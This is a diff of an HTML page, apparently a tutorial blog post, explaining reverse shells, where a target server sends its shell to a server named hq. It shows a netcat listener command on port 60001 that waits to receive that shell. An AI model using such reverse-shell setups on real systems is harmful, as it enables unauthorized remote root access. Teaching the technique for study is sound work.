@@ -66,7 +66,7 @@
 </header>
 
   <div class="entry-content"><p>A reverse shell is achieved when you "send" a server's shell (in my demo the server is named <code>target</code>) to another server (<code>hq</code> in my setup).</p>
-<p>Using this technique you can run root commands on a server you aren't connected.</p>
+<p>Using this technique you can run <code>root</code> commands on a server you aren't connected.</p>
 <div class="highlight"><pre><span></span><span class="gp">#</span> open up a tcp port on the <span class="s2">&quot;hq&quot;</span> server to <span class="s2">&quot;receive&quot;</span> the reverse shell
 <span class="gp">$</span> nc -n -l -p <span class="m">60001</span>
 </pre></div>
